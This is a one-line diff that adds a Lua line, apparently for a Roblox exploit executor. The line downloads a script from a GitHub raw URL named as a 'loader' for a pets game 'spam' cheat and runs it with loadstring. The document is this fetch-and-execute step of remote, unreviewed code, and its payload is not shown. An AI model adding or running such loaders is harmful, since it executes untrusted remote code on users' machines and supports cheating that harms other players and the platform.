@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/BudgieRectifier/loaders/main/loaders/upd-pets-universe-spam1-c8a8bmkto9v9pl.lua"))()
